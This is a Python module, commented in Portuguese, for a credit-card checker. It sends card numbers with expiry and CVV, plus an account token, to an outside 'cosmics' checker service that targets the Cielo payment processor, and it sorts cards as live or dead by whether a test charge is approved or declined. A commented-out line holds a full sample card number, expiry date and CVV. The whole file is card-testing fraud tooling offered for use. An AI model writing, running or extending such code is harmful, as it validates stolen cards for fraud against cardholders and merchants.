import sys
sys.path.insert(1, '././')

from defs import arq
from defs import ca
import requests

def auth():
    dados = arq.ler_json(ca.config)['checker']['cosmics']
    
    return {
        "login": dados['login'],
        "senha": dados['senha'],
        "token": dados['token']
    }

def corte(texto, inicio, final):
    
    if inicio in texto:
        if final in texto:
            texto = texto.split(inicio)[1].strip()
            texto = texto.split(final)[0].strip()
            return texto
        else:
            return 'final não encontrado'
    
    else:
        return 'inicio não encontrado'


def debito(cc):
    token = auth()["token"]
    response = requests.get(f'https://lojastorebotcosmics.tech/chks/cielo.php?list={cc}&token={token}')

    if response.status_code == 200 and response.text != "":
        retorno = response.text.upper()
        print(retorno)
        status = corte(retorno, '<B>', '</FONT>')
        debito = corte(retorno, 'R$', '|')
        
        try:
            if "CHAME UM ADM" in retorno:
                return {
                    "status": False,
                    "live": False,
                    "message": f"CHAME UM ADM"
                    
            }
                
            if "APROVADA" in status:
                return {
                    "status": True,
                    "live": True,
                    "message": f"APROVADA DEBITOU R${debito}"
                    
                }
                
            if "REPROVADA" in status:
                return {
                    "status": True,
                    "live": False,
                    "message": f"REPROVADA RECUSOU R${debito}"
                }
                
            if "FALTOU ALGO NESSA CC AI" in status:
                return {
                    "status": True,
                    "live": False,
                    "message": f"Faltou algo na CC"
                }
            else:
                return {
                "status": False,
                "live": False,
                "message": f"Retorno desconhecido {retorno}"
            }
                
        except:
            return {
                "status": False,
                "live": False,
                "message": f"Erro na api python",
            }
                
    else:
        return {
            "status": False,
            "live": False,
            "message": f"Erro ao se conectar com o checker, código {response.status_code}",
        }
        
#print(debito('4984015052664547|05|2026|946'))